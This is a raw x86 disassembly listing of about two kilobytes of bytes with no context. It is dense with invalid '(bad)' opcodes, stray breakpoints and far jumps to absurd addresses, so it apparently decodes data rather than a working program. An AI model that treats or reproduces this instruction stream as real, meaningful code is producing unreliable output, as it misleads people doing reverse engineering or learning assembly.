  43dcda:	call   DWORD PTR [eax]
  43dcdc:	fwait
  43dcdd:	add    cl,bl
  43dcdf:	add    BYTE PTR [ebx-0x5d697c58],al
  43dce5:	int3   
  43dce6:	ja     0x43dc6b
  43dce8:	add    BYTE PTR [edi],ah
  43dcea:	(bad)  
  43dceb:	inc    BYTE PTR [ebx-0x34]
  43dcee:	js     0x43dc79
  43dcf0:	int3   
  43dcf1:	or     al,0x0
  43dcf3:	pop    eax
  43dcf4:	jmp    DWORD PTR es:[edx]
  43dcf7:	add    BYTE PTR [eax],al
  43dcf9:	and    edi,edi
  43dcfb:	xchg   edx,eax
  43dcfc:	push   ebx
  43dcfd:	push   DWORD PTR [ebx+eax*4+0x1cffd6ff]
  43dd04:	dec    esp
  43dd05:	add    BYTE PTR [edi-0x33e83400],bh
  43dd0b:	mov    BYTE PTR [esi+0x2a83],ah
  43dd11:	test   DWORD PTR [ecx-0x6f006510],0xff31cc83
  43dd1b:	fadd   QWORD PTR [ecx]
  43dd1d:	call   DWORD PTR [eax]
  43dd1f:	int3   
  43dd20:	call   FWORD PTR [edx-0x9fd100]
  43dd26:	mov    ds:0x8393ff00,al
  43dd2b:	cmp    al,BYTE PTR [esi-0x1]
  43dd2e:	jb     0x43dd2f
  43dd30:	add    BYTE PTR [ebp-0x3396ee77],al
  43dd36:	adc    DWORD PTR [eax],eax
  43dd38:	push   DWORD PTR [ebx+0xaeccff]
  43dd3e:	data16 add BYTE PTR [eax],al
  43dd41:	loop   0x43dd43
  43dd43:	dec    ecx
  43dd44:	call   0xccc6fd49
  43dd49:	mov    eax,0xffd96b00
  43dd4e:	sub    ah,cl
  43dd50:	int3   
  43dd51:	ret    
  43dd52:	dec    DWORD PTR [eax-0x7c41000b]
  43dd58:	push   DWORD PTR [edi+0xe08800]
  43dd5e:	xor    edi,edi
  43dd60:	call   DWORD PTR [edi-0x1]
  43dd63:	stos   DWORD PTR es:[edi],eax
  43dd64:	pop    edi
  43dd65:	mov    DWORD PTR [edi+edi*8-0x5476aa01],ebp
  43dd6c:	loope  0x43dd6d
  43dd6e:	jge    0x43dd3c
  43dd70:	jmp    FWORD PTR [edx]
  43dd72:	add    BYTE PTR [ecx],ah
  43dd74:	fdiv   st(7),st
  43dd76:	pop    ebp
  43dd77:	add    ah,cl
  43dd79:	outs   dx,DWORD PTR ds:[esi]
  43dd7a:	add    BYTE PTR [esi-0x690064],al
  43dd80:	add    dl,bh
  43dd82:	call   FWORD PTR [ecx+0x57]
  43dd85:	mov    esi,esi
  43dd87:	int3   
  43dd88:	dec    esi
  43dd8a:	jmp    FWORD PTR [ebx+edi*4-0x34]
  43dd8e:	rol    BYTE PTR [ebx-0x54ff8000],0x31
  43dd95:	xor    DWORD PTR [ebx-0x1],0x0
  43dd99:	xchg   esp,ecx
  43dd9b:	sti    
  43dd9c:	xchg   edi,edi
  43dd9e:	daa    
  43dd9f:	inc    DWORD PTR [ebx+0x46d90009]
  43dda5:	add    cl,bh
  43dda7:	add    BYTE PTR [eax],al
  43dda9:	jmp    0xf9:0x336089
  43ddb0:	add    BYTE PTR [ebx],cl
  43ddb2:	push   DWORD PTR [ecx]
  43ddb4:	mov    ds:0xff007aff,al
  43ddb9:	add    al,0x0
  43ddbb:	add    DWORD PTR ds:0x899700,ebx
  43ddc1:	xchg   edi,eax
  43ddc2:	add    BYTE PTR [ecx+edi*8],al
  43ddc5:	add    BYTE PTR [ebx-0x7d],cl
  43ddc8:	int3   
  43ddc9:	clc    
  43ddca:	add    BYTE PTR [eax+esi*8-0x7d],dh
  43ddce:	je     0x43ddd0
  43ddd0:	call   esp
  43ddd2:	add    BYTE PTR [edi+0x17],al
  43ddd5:	jmp    DWORD PTR [esi-0x1]
  43ddd8:	or     DWORD PTR [esi-0x940534],0x24
  43dddf:	add    DWORD PTR [eax],0xffffffdf
  43dde2:	push   eax
  43dde4:	or     al,BYTE PTR [ebx-0x2b00006d]
  43ddea:	add    BYTE PTR [ecx-0x76267c58],bl
  43ddf0:	sub    DWORD PTR [edi+edi*8-0x4a],0xffffffb0
  43ddf5:	mov    DWORD PTR [ecx-0x1],ebx
  43ddf8:	add    al,bl
  43ddfa:	(bad)  
  43ddfb:	cmp    bl,dl
  43ddfd:	push   DWORD PTR [esi+0xa70000]
  43de03:	cwde   
  43de04:	jns    0x43de05
  43de06:	push   edi
  43de07:	inc    DWORD PTR [eax]
  43de09:	dec    esi
  43de0a:	jmp    FWORD PTR [eax]
  43de0c:	sti    
  43de0d:	add    BYTE PTR [esi],al
  43de0f:	dec    esp
  43de11:	fwait
  43de12:	sbb    DWORD PTR [esi],0xffffff92
  43de15:	(bad)  
  43de16:	mov    esp,0xffddccff
  43de1b:	shl    DWORD PTR [esi+0x8cff],1
  43de21:	pop    edx
  43de22:	inc    DWORD PTR ds:0xff9aff4a
  43de28:	int3   
  43de29:	ret    
  43de2a:	int3   
  43de2b:	and    BYTE PTR [edi+edi*8-0x3c7c33d5],ah
  43de32:	dec    DWORD PTR [ecx-0x2001a]
  43de38:	add    BYTE PTR [edi-0x1],dl
  43de3b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43de3c:	or     bh,bh
  43de3e:	in     al,dx
  43de3f:	add    BYTE PTR [eax],al
  43de41:	fadd   DWORD PTR [eax]
  43de43:	dec    esp
  43de44:	pop    esp
  43de45:	mov    DWORD PTR [esi],eax
  43de47:	inc    DWORD PTR [eax]
  43de49:	loop   0x43de4b
  43de4b:	call   0xff6eddb3
  43de50:	dec    DWORD PTR [edx]
  43de52:	add    dh,bh
  43de54:	loop   0x43de55
  43de56:	int3   
  43de57:	cmp    edi,0xffffff83
  43de5a:	jmp    ebp
  43de5c:	dec    DWORD PTR ds:[eax+0x0]
  43de60:	jmp    FWORD PTR [ebp-0x7cc2f900]
  43de66:	mov    ds:0xff08ff83,al
  43de6b:	ret    
  43de6c:	inc    edi
  43de6d:	call   DWORD PTR [edi]
  43de6f:	(bad)  
  43de70:	inc    DWORD PTR [eax+eax*1]
  43de73:	mov    al,0xa0
  43de75:	push   DWORD PTR [edx]
  43de77:	mov    esp,ecx
  43de79:	mov    bl,0x0
  43de7b:	mov    esi,es
  43de7d:	add    BYTE PTR [ebx],cl
  43de7f:	int3   
  43de80:	call   FWORD PTR [edi-0x338afb01]
  43de86:	(bad)  
  43de88:	jmp    DWORD PTR [ecx]
  43de8a:	push   DWORD PTR [esi]
  43de8c:	cwde   
  43de8d:	add    BYTE PTR [esi-0x1],cl
  43de90:	inc    DWORD PTR [edi]
  43de92:	dec    DWORD PTR [ebx]
  43de94:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43de95:	add    al,bh
  43de97:	mov    edi,edi
  43de99:	add    al,BYTE PTR [eax]
  43de9b:	cmp    al,0x81
  43de9d:	(bad)  
  43de9e:	jnp    0x43de23
  43dea0:	jmp    ecx
  43dea2:	jmp    DWORD PTR [eax-0x6700be]
  43dea8:	(bad)  
  43dea9:	inc    BYTE PTR [ebx-0x400b39c]
  43deaf:	add    DWORD PTR [eax],0x1c
  43deb2:	inc    edi
  43deb4:	jge    0x43deb6
  43deb6:	mov    bl,0x89
  43deb8:	jmp    DWORD PTR [ebp-0x1]
  43debb:	pop    ds
  43debc:	push   ecx
  43debd:	mov    DWORD PTR [ecx-0x6d0000],edi
  43dec3:	inc    edi
  43dec4:	iret   
  43dec5:	call   DWORD PTR [ecx-0x1]
  43dec8:	int3   
  43dec9:	and    bh,bh
  43decb:	sahf   
  43decc:	sti    
  43decd:	(bad)  
  43dece:	inc    DWORD PTR [ebx+0x1dccc400]
  43ded4:	sar    edi,1
  43ded6:	and    eax,0xfffdffff
  43dedb:	js     0x43defa
  43dedd:	add    BYTE PTR ds:0x1d0000,ch
  43dee3:	push   0xffffff8e
  43dee5:	mov    ebp,esi
  43dee7:	inc    DWORD PTR [ebx+0x921830e]
  43deed:	adc    DWORD PTR [ecx-0x330034],0xffffff8f
  43def4:	xchg   esp,eax
  43def5:	add    BYTE PTR [ebx-0xd3ff01],bl
  43defb:	or     DWORD PTR [ebx],esi
  43defd:	add    BYTE PTR ds:0x3c8900,bh
  43df03:	cmp    esi,ebx
  43df05:	add    BYTE PTR [ecx-0x7d],dl
  43df08:	int3   
  43df09:	sbb    eax,0x40600
  43df0e:	iret   
  43df0f:	add    DWORD PTR [eax],0x38
  43df12:	xor    DWORD PTR [ebx+0x25ff77],0xffffffff
  43df19:	clc    
  43df1a:	xor    DWORD PTR [esi+0x8ff6d],0xffffffcc
  43df21:	fild   DWORD PTR [eax]
  43df23:	xchg   esp,eax
  43df24:	lods   eax,DWORD PTR ds:[esi]
  43df25:	inc    DWORD PTR [eax-0xa10077]
  43df2b:	pop    ebx
  43df2c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43df2d:	int3   
  43df2e:	loopne 0x43df2f
  43df30:	add    BYTE PTR [ebx],bl
  43df32:	add    ah,cl
  43df34:	out    dx,al
  43df35:	(bad)  
  43df36:	out    dx,al
  43df37:	add    BYTE PTR [eax],al
  43df39:	cmp    BYTE PTR [ebx+0x1600ee9a],al
  43df3f:	cmp    edi,0xffffff83
  43df42:	inc    DWORD PTR [ebp-0x31]
  43df45:	jmp    FWORD PTR [ecx-0xa87c01]
  43df4b:	ins    BYTE PTR es:[edi],dx
  43df4c:	inc    DWORD PTR [bx+si]
  43df4f:	cmp    edi,0xffffff86
  43df52:	add    BYTE PTR [ebx],al
  43df54:	pop    esi
  43df55:	add    DWORD PTR [ecx-0x1],0xffffffcc
  43df59:	scas   al,BYTE PTR es:[edi]
  43df5a:	add    BYTE PTR [ebp+0x14],bh
  43df5d:	or     DWORD PTR [edx+0xbdff89],0xffffffbb
  43df64:	inc    BYTE PTR [eax]
  43df66:	loope  0x43df67
  43df68:	add    DWORD PTR [esp+ecx*8],0xa
  43df6c:	push   edx
  43df6d:	mov    DWORD PTR [edi+edi*8],edx
  43df70:	add    BYTE PTR ds:0xff0a1389,ch
  43df76:	fld    QWORD PTR [eax]
  43df78:	mov    DWORD PTR [ecx-0x8c9f01],esp
  43df7e:	inc    edx
  43df7f:	inc    DWORD PTR [ebx-0xb10ff0e]
  43df85:	int3   
  43df86:	jle    0x43df88
  43df88:	sbb    DWORD PTR [eax+0x0],0xffffffa2
  43df8c:	rol    DWORD PTR [eax],cl
  43df8e:	cdq    
  43df8f:	add    BYTE PTR [eax],al
  43df91:	sbb    al,0x89
  43df93:	cmc    
  43df94:	jp     0x43df62
  43df96:	(bad)  
  43df97:	(bad)  
  43df98:	jmp    FWORD PTR [ecx-0x359701]
  43df9e:	jnp    0x43df9f
  43dfa0:	push   DWORD PTR ds:0x89240a83
  43dfa6:	sahf   
  43dfa7:	inc    DWORD PTR [eax]
  43dfa9:	push   esp
  43dfaa:	call   DWORD PTR [ebx-0x7cb23301]
  43dfb0:	add    BYTE PTR [ebx-0x1],al
  43dfb3:	loop   0x43df41
  43dfb5:	call   FWORD PTR [ebx]
  43dfb7:	(bad)  
  43dfb8:	(bad)  
  43dfb9:	jg     0x43dfba
  43dfbb:	imul   eax,esi,0xffff4100
  43dfc1:	sahf   
  43dfc2:	cmp    DWORD PTR [eax],0x79
  43dfc5:	add    dh,ch
  43dfc7:	(bad)  
  43dfc8:	jmp    FWORD PTR [eax]
  43dfca:	mov    DWORD PTR [edi],edx
  43dfcc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43dfcd:	add    BYTE PTR [eax-0x910100],cl
  43dfd3:	or     bh,BYTE PTR [edi+0x83c9ff]
  43dfd9:	mov    ebp,0xff5e8100
  43dfde:	in     eax,0x83
  43dfe0:	add    BYTE PTR [esi+0x0],bh
  43dfe3:	mov    al,0x36
  43dfe5:	dec    DWORD PTR [edi]
  43dfe7:	inc    DWORD PTR [eax]
  43dfe9:	outs   dx,BYTE PTR ds:[esi]
  43dfea:	add    BYTE PTR [edi],dh
  43dfec:	sub    cl,ah
  43dfee:	cli    
  43dfef:	add    DWORD PTR [ebx-0x7b787605],0xffffffff
  43dff6:	mov    esp,ecx
  43dff8:	add    BYTE PTR [esi+0x0],bl
  43dffb:	push   ss
  43dffc:	fmul   st,st(4)
  43dffe:	add    edi,edi
  43e000:	push   DWORD PTR [edi+edi*8]
  43e003:	and    ecx,DWORD PTR [esi-0x339e00]
  43e009:	cmp    eax,0x83ba2bff
  43e00e:	mov    ds:0xff5a83ff,al
  43e013:	cmp    ecx,0xffffffff
  43e016:	mov    ah,0xff
  43e018:	add    BYTE PTR [ebx],ch
  43e01a:	(bad)  
  43e01b:	dec    esp
  43e01d:	add    BYTE PTR [ebp-0x1],cl
  43e020:	jmp    DWORD PTR [edi]
  43e022:	cmp    DWORD PTR [edi+0x2d],0x0
  43e026:	or     edi,edi
  43e028:	int3   
  43e029:	loopne 0x43e02b
  43e02b:	gs sar bh,0x79
  43e02f:	mov    DWORD PTR [eax],eax
  43e031:	sbb    bh,bh
  43e033:	cld    
  43e034:	and    ecx,DWORD PTR [ecx-0x20007c59]
  43e03a:	cmp    DWORD PTR [eax-0x5c00a5],0x0
  43e041:	cmp    eax,DWORD PTR [ebx-0x26ffeb10]
  43e047:	inc    DWORD PTR [eax]
  43e049:	leave  
  43e04a:	or     esp,0xffffffc0
  43e04d:	int3   
  43e04e:	push   0xffba00ff
  43e053:	nop
  43e054:	push   ss
  43e055:	add    BYTE PTR [edi],ah
  43e057:	add    BYTE PTR [ecx+0x5e9fff7c],cl
  43e05d:	add    DWORD PTR [ebp-0x1],0x0
  43e061:	inc    esi
  43e062:	inc    esp
  43e064:	scas   eax,DWORD PTR es:[edi]
  43e065:	add    DWORD PTR [edi-0x107c01],0x33
  43e06c:	mov    cl,0xff
  43e06e:	or     bh,bh
  43e070:	add    BYTE PTR ds:0x89a77f00,cl
  43e076:	sti    
  43e077:	mov    DWORD PTR [eax],eax
  43e079:	lahf   
  43e07a:	add    BYTE PTR ds:0xff45008e,ch
  43e080:	add    BYTE PTR [ebx-0x331e2501],dh
  43e086:	mov    ecx,esp
  43e088:	sub    edx,0xffffffff
  43e08b:	adc    DWORD PTR [esi-0xffe177],edi
  43e091:	mov    bl,0x0
  43e093:	jmp    0x1d89:0xffc700c1
  43e09a:	add    BYTE PTR [esi],bl
  43e09c:	sbb    BYTE PTR [ebx-0x40ff007c],al
  43e0a2:	or     DWORD PTR [edx-0xc9ff28],0xffffffff
  43e0a9:	nop
  43e0aa:	int3   
  43e0ab:	call   0x9283:0x59ff1c
  43e0b2:	call   FWORD PTR [ecx]
  43e0b4:	xchg   ebx,eax
  43e0b5:	add    BYTE PTR [ecx+0x6d83cc],bl
  43e0bb:	stos   BYTE PTR es:[edi],al
  43e0bc:	jb     0x43e08a
  43e0be:	xor    al,0xff
  43e0c0:	jmp    FWORD PTR [ebp-0x1]
  43e0c3:	push   ecx
  43e0c4:	push   0x6f83
  43e0c9:	or     al,0xff
  43e0cb:	out    0x91,al
  43e0cd:	add    BYTE PTR [edx],ch
  43e0cf:	add    bh,bh
  43e0d1:	test   al,0xff
  43e0d3:	xchg   ebx,eax
  43e0d4:	repz add BYTE PTR [edi+edi*8+0x6d8923ff],bl
  43e0dc:	mov    eax,ds:0x8389e000
  43e0e1:	dec    ebx
  43e0e2:	mov    DWORD PTR [edx],edi
  43e0e4:	or     eax,DWORD PTR [eax]
  43e0e6:	xchg   edi,edi
  43e0e8:	add    BYTE PTR [eax],ch
  43e0ea:	add    BYTE PTR [edx],dl
  43e0ec:	ret    0x8589
  43e0ef:	inc    DWORD PTR [eax]
  43e0f1:	in     al,0xff
  43e0f3:	lods   al,BYTE PTR ds:[esi]
  43e0f4:	inc    edx
  43e0f5:	add    BYTE PTR [esi+0x0],al
  43e0f8:	call   DWORD PTR [edx]
  43e0fa:	add    dh,bh
  43e0fc:	test   eax,0xff83d5ff
  43e101:	sub    eax,DWORD PTR [eax]
  43e103:	jle    0x43e14c
  43e105:	call   DWORD PTR [edx-0x1]
  43e108:	inc    DWORD PTR [eax+0xdcd1ff]
  43e10e:	cdq    
  43e10f:	mov    edi,edi
  43e111:	call   0xa7:0xffe197ff
  43e118:	int3   
  43e119:	jle    0x43e11b
  43e11b:	jecxz  0x43e18a
  43e11d:	add    cl,dh
  43e11f:	add    bh,bh
  43e121:	pop    ecx
  43e122:	add    BYTE PTR [edx+0x50],dl
  43e125:	mov    DWORD PTR [ecx-0x1],ebp
  43e128:	int3   
  43e129:	fwait
  43e12a:	mov    DWORD PTR [ecx-0x39],ebx
  43e12d:	add    BYTE PTR [ecx],dl
  43e12f:	int3   
  43e130:	add    BYTE PTR [eax+eax*1],ch
  43e133:	div    DWORD PTR [ecx]
  43e135:	adc    esp,0xffffffff
  43e138:	add    BYTE PTR [ebp+0x0],bl
  43e13b:	pop    edi
  43e13c:	call   DWORD PTR cs:[edi+0x56ff00]
  43e143:	push   es
  43e144:	sbb    al,BYTE PTR [eax]
  43e146:	aad    0xff
  43e148:	int3   
  43e149:	push   ds
  43e14a:	add    eax,0x1f
  43e14d:	and    DWORD PTR [edx],0xffffffff
  43e150:	add    BYTE PTR [ecx-0xed9901],dl
  43e156:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43e157:	(bad)  
  43e158:	call   FWORD PTR [eax+eax*1-0x43ffdc8f]
  43e15f:	(bad)  
  43e160:	push   DWORD PTR [esi]
  43e162:	call   FWORD PTR [ecx-0xa800df]
  43e168:	inc    DWORD PTR [edx+0xceb2ff]
  43e16e:	push   eax
  43e16f:	(bad)  
  43e170:	(bad)  
  43e171:	(bad)  
  43e173:	dec    eax
  43e174:	push   ds
  43e175:	add    BYTE PTR [ebp+0xfbcccc],dh
  43e17b:	cmp    eax,0x2a0042
  43e180:	add    BYTE PTR [ebx+eax*4],al
  43e183:	clc    
  43e184:	out    dx,al
  43e185:	int3   
  43e186:	pop    edx
  43e187:	add    bh,bh
  43e189:	mov    edi,?
  43e18b:	dec    esi
  43e18c:	ins    BYTE PTR es:[edi],dx
  43e18d:	push   DWORD PTR [ebp-0x8d7601]
  43e193:	inc    edi
  43e194:	xor    edi,edi
  43e196:	xchg   edx,eax
  43e197:	(bad)  
  43e198:	jmp    DWORD PTR [edi+0x72c689]
  43e19e:	jnp    0x43e123
  43e1a0:	add    BYTE PTR [ebx+eax*4+0x62009c92],cl
  43e1a7:	add    bh,bh
  43e1a9:	fild   WORD PTR [ebx+0x6e00bf06]
  43e1af:	(bad)  
  43e1b0:	jmp    DWORD PTR [ecx]
  43e1b2:	sbb    DWORD PTR [esi],0x63
  43e1b5:	add    BYTE PTR [edi+edi*8],bl
  43e1b8:	add    BYTE PTR [esi-0x1],ah
  43e1bb:	in     al,0xba
  43e1bd:	sbb    DWORD PTR [esi-0x34],0xffffffff
  43e1c1:	jne    0x43e146
  43e1c3:	cmc    
  43e1c4:	inc    ebx
  43e1c5:	dec    DWORD PTR [edi]
  43e1c7:	mov    DWORD PTR [ebx+0x6ecfff2c],eax
  43e1cd:	call   FWORD PTR [ecx+ecx*4]
  43e1d0:	add    BYTE PTR [edi],bl
  43e1d2:	jmp    FWORD PTR [esi+0x3b8970]
  43e1d8:	add    BYTE PTR [eax+0x0],dh
  43e1db:	(bad)  
  43e1dc:	add    BYTE PTR ds:[edi+0x8a89ff],dl
  43e1e3:	xchg   ebp,eax
  43e1e4:	(bad)  
  43e1e7:	add    bh,bh
  43e1e9:	pop    ebx
  43e1ea:	inc    DWORD PTR [ebx]
  43e1ec:	popa   
  43e1ed:	and    ecx,0x0
  43e1f0:	int3   
  43e1f1:	mov    edx,0xff01c300
  43e1f6:	xchg   ecx,eax
  43e1f7:	add    BYTE PTR [eax],al
  43e1f9:	pop    ecx
  43e1fa:	jmp    FWORD PTR [eax]
  43e1fc:	or     eax,0xffff8e83
  43e201:	pop    ebx
  43e202:	jmp    edi
  43e204:	xor    edi,edi
  43e206:	inc    BYTE PTR [eax]
  43e208:	add    ch,al
  43e20a:	call   edi
  43e20c:	xchg   edx,eax
  43e20d:	call   FWORD PTR [eax]
  43e20f:	inc    DWORD PTR [eax]
  43e211:	cmp    al,0xff
  43e213:	mov    eax,0x83d2cc64
  43e218:	dec    DWORD PTR [edx-0x753301]
  43e21e:	adc    ecx,esp
  43e220:	int3   
  43e221:	push   edx
  43e222:	or     DWORD PTR [esi-0x36],0xffffffff
  43e226:	sahf   
  43e227:	add    BYTE PTR [ecx-0x48c97c0a],cl
  43e22d:	inc    DWORD PTR [edx-0x33590000]
  43e233:	cmp    dl,BYTE PTR [edi-0xff6801]
  43e239:	mov    es,WORD PTR [ebx-0x387c721f]
  43e23f:	or     DWORD PTR [ecx-0x41f5ff83],0xffffffff
  43e246:	test   eax,0xff6300ff
  43e24b:	lahf   
  43e24c:	lea    eax,[eax]
  43e24e:	int    0xff
  43e250:	mov    DWORD PTR [eax-0x835000],ebp
  43e256:	add    bh,bh
  43e258:	jmp    FWORD PTR [edi+0xc0b1ff]
  43e25e:	dec    esp
  43e260:	call   FWORD PTR [ecx+0x0]
  43e263:	fild   DWORD PTR [esi]
  43e265:	add    BYTE PTR [ecx],bh
  43e267:	int3   
  43e268:	add    BYTE PTR [edi+edi*8+0x800603d],dl
  43e26f:	int3   
  43e270:	add    dh,dl
  43e272:	inc    DWORD PTR [ebp+eiz*4-0x3300eb01]
  43e279:	push   0x83a6cc00
  43e27e:	int3   
  43e27f:	dec    esp
  43e281:	or     BYTE PTR [eax],al
  43e283:	ins    DWORD PTR es:[edi],dx
  43e284:	push   ecx
  43e285:	inc    eax
  43e287:	mov    edi,edi
  43e289:	push   edx
  43e28a:	jmp    FWORD PTR [ebx-0x450070]
  43e290:	add    BYTE PTR [ebx-0x336f2601],ch
  43e296:	and    al,0xff
  43e298:	add    ah,dh
  43e29a:	add    ah,dh
  43e29c:	or     eax,DWORD PTR [ebx-0x30760034]
  43e2a2:	push   edi
  43e2a4:	rol    BYTE PTR [eax],cl
  43e2a6:	push   esp
  43e2a7:	add    BYTE PTR [ebx+0x2b32ffad],al
  43e2ad:	add    dl,bh
  43e2af:	add    BYTE PTR [ebx+0x5a22ffe8],al
  43e2b5:	jmp    DWORD PTR [ebp-0xb9ff01]
  43e2bb:	fnsave [ebp-0xff4101]
  43e2c1:	or     esp,0x3083ff2e
  43e2c7:	(bad)  
  43e2c8:	(bad)  
  43e2c9:	out    dx,eax
  43e2ca:	add    BYTE PTR [ebx-0x55],cl
  43e2cd:	jmp    esp
  43e2cf:	add    bh,bh
  43e2d1:	repnz add ch,ah
  43e2d4:	ret    0xb889
  43e2d7:	add    bh,bh
  43e2d9:	inc    edx
  43e2da:	call   FWORD PTR [ecx]
  43e2dc:	mov    bh,bh
  43e2de:	jo     0x43e2df
  43e2e0:	push   DWORD PTR [edi]
  43e2e2:	inc    DWORD PTR [ebx-0x26]
  43e2e5:	mov    DWORD PTR [ebp+0x0],edi
  43e2e8:	add    BYTE PTR [esi-0x1],al
  43e2eb:	mov    fs,WORD PTR [edi]
  43e2ed:	int3   
  43e2ee:	xchg   esp,eax
  43e2ef:	mov    DWORD PTR [ebx-0x7205008c],eax
  43e2f5:	add    BYTE PTR [ebx-0x6aff7d],dl
  43e2fb:	inc    esi
  43e2fc:	out    0xff,eax
  43e2fe:	mov    es,WORD PTR [eax]
  43e300:	sub    DWORD PTR [ecx+0x0],0xffffffe3
  43e304:	out    0x0,al
  43e306:	push   eax
  43e307:	mov    DWORD PTR [eax],eax
  43e309:	test   al,0x0
  43e30b:	or     BYTE PTR [ebx-0x1],bl
  43e30e:	or     edi,edi
  43e310:	inc    DWORD PTR [eax-0x1]
  43e313:	or     eax,0xff75ff1f
  43e318:	add    BYTE PTR [ebp+0x733aff],ch
  43e31e:	add    edi,edi
  43e320:	call   eax
  43e322:	(bad)  
  43e323:	jmp    0x9bff:0x8316ff85
  43e32a:	adc    esi,0xffffffb8
  43e32d:	add    BYTE PTR [ebx],bl
  43e32f:	inc    DWORD PTR [eax]
  43e331:	(bad)  
  43e332:	call   FWORD PTR [ecx]
  43e334:	aas    
  43e335:	int3   
  43e336:	or     bh,bh
  43e338:	add    BYTE PTR [edx-0x8cc601],cl
  43e33e:	je     0x43e340
  43e340:	int3   
  43e341:	push   DWORD PTR ss:[ecx+esi*4+0x0]
  43e346:	lock (bad) 
  43e348:	jmp    DWORD PTR [ecx-0x436d00]
  43e34e:	mov    al,0xff
  43e350:	(bad)  
  43e351:	jl     0x43e352
  43e353:	jmp    0x43e3bd
  43e355:	add    BYTE PTR [ebp-0x1],ch
  43e358:	add    BYTE PTR [eax-0x7d],dh
  43e35b:	mov    eax,ds:0xff380085
  43e360:	add    BYTE PTR [eax+0x0],dl
  43e363:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43e364:	xchg   esi,eax
  43e365:	sbb    eax,0x0
  43e368:	(bad)  
  43e369:	fld    QWORD PTR [ebx+0x3000cc6a]
  43e36f:	mov    DWORD PTR [eax],eax
  43e371:	xchg   ecx,eax
  43e372:	mov    eax,eax
  43e374:	retf   
  43e375:	(bad)  
  43e376:	mov    edi,0xff990089
  43e37b:	xor    DWORD PTR [edx+0x49ff],esi
  43e381:	arpl   WORD PTR [eax],ax
  43e383:	test   ch,al
  43e385:	add    ah,ch
  43e387:	cmp    edi,0xffffffbe
  43e38a:	add    bh,cl
  43e38c:	xchg   esp,eax
  43e38d:	inc    DWORD PTR [ecx-0x480000]
  43e393:	adc    ebx,edx
  43e395:	dec    DWORD PTR [edx]
  43e397:	inc    DWORD PTR [eax]
  43e399:	xchg   esp,eax
  43e39a:	call   DWORD PTR [ebx-0x9]
  43e39d:	or     esp,0xffffffff
  43e3a0:	add    BYTE PTR [esi],bl
  43e3a2:	add    al,ah
  43e3a4:	loopne 0x43e372
  43e3a6:	adc    eax,DWORD PTR [eax]
  43e3a8:	cmp    DWORD PTR [edi+edi*8],0x1d
  43e3ac:	popa   
  43e3ad:	add    BYTE PTR [edx],ch
  43e3af:	add    bh,bh
  43e3b1:	cmp    edi,0xffffffaa
  43e3b4:	mov    dh,0x89
  43e3b6:	mov    eax,ds:0xcca000ff
  43e3bb:	popf   
  43e3bc:	out    dx,eax
  43e3bd:	add    BYTE PTR [edi+edi*8],bl
  43e3c0:	(bad)  
  43e3c1:	jg     0x43e346
  43e3c3:	shr    BYTE PTR [edx+0xfff583],1
  43e3c9:	out    0xcc,eax
  43e3cb:	sub    dl,BYTE PTR ds:0xff89e683
  43e3d1:	jge    0x43e3d3
  43e3d3:	or     edi,esp
  43e3d5:	add    dh,dl
  43e3d7:	(bad)  
  43e3d8:	jmp    FWORD PTR [ebx-0x7c785001]
  43e3de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43e3df:	(bad)  
  43e3e0:	(bad)  
  43e3e1:	cmp    edi,edi
  43e3e3:	pop    ecx
  43e3e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43e3e5:	or     esp,0xffffff83
  43e3e8:	jmp    DWORD PTR [edi-0x1]
  43e3eb:	and    dl,0x83
  43e3ee:	dec    ecx
  43e3ef:	(bad)  
  43e3f0:	(bad)  
  43e3f1:	cmp    eax,0x501bff
  43e3f6:	sub    edi,edi
  43e3f8:	add    ch,bh
  43e3fa:	sub    DWORD PTR [ebx+0x15ff1c],0x0
  43e401:	xor    bh,bh
  43e403:	inc    edx
  43e404:	je     0x43e405
  43e406:	mov    eax,0x83d983cc
  43e40b:	pop    ebx
  43e40c:	scas   eax,DWORD PTR es:[edi]
  43e40d:	add    BYTE PTR [edi],cl
  43e40f:	add    BYTE PTR [eax],al
  43e411:	add    eax,0x452aff
  43e416:	xor    bh,bh
  43e418:	mov    DWORD PTR [edi],ebx
  43e41a:	add    bh,bl
  43e41c:	push   ebp
  43e41d:	int3   
  43e41e:	fiadd  WORD PTR [ebx-0xb005f01]
  43e424:	test   BYTE PTR [eax],0x9e
  43e427:	add    bh,bh
  43e429:	xchg   edi,eax
  43e42a:	call   ebx
  43e42c:	jmp    0x43e42e
  43e42e:	mov    al,0x0
  43e430:	dec    DWORD PTR [edi+0x421183]
  43e436:	retf   0xff
  43e439:	mov    ?,edi
  43e43b:	pop    ss
  43e43c:	xor    BYTE PTR [ebx+0x59000005],al
  43e442:	add    bh,dh
  43e444:	sbb    al,0xff
  43e446:	inc    ebp
  43e447:	add    BYTE PTR [ecx+0x7420cc29],cl
  43e44d:	dec    DWORD PTR [edi-0x1]
  43e450:	call   DWORD PTR [ebp-0x1]
  43e453:	rol    ecx,cl
  43e455:	sbb    edi,0xffffffff
  43e458:	adc    DWORD PTR [edi+edi*8],0x32
  43e45c:	cmp    edi,edi
  43e45e:	mov    edi,edi
  43e460:	jmp    eax
  43e462:	add    al,ah
  43e464:	int3   
  43e465:	add    ch,dh
  43e467:	(bad)  
  43e468:	push   DWORD PTR [edx]
  43e46a:	add    ch,bl
  43e46c:	hlt    
  43e46d:	adc    DWORD PTR [ebp-0x1],0xffffffcc
  43e471:	es (bad) 
  43e473:	fadd   QWORD PTR [edx]
  43e475:	add    BYTE PTR [eax+0x0],bl
  43e478:	call   DWORD PTR [ebx+eax*4-0x35]
  43e47c:	cwde   
  43e47d:	inc    eax
  43e47f:	dec    DWORD PTR [ecx-0x4a950084]
  43e485:	(bad)  
  43e486:	jmp    0xffa6e40e
  43e48b:	mov    edx,DWORD PTR [eax-0x7d]
  43e48e:	pop    ds
  43e48f:	mov    DWORD PTR [eax],eax
  43e491:	add    al,0xcc
  43e493:	jp     0x43e481
  43e495:	inc    DWORD PTR [edx+0x0]
  43e498:	push   edx
  43e49a:	mov    DWORD PTR [ecx-0x8c00cf],ebp
  43e4a0:	jmp    DWORD PTR [edx]
  43e4a2:	call   DWORD PTR [ebp+0xadff3e]
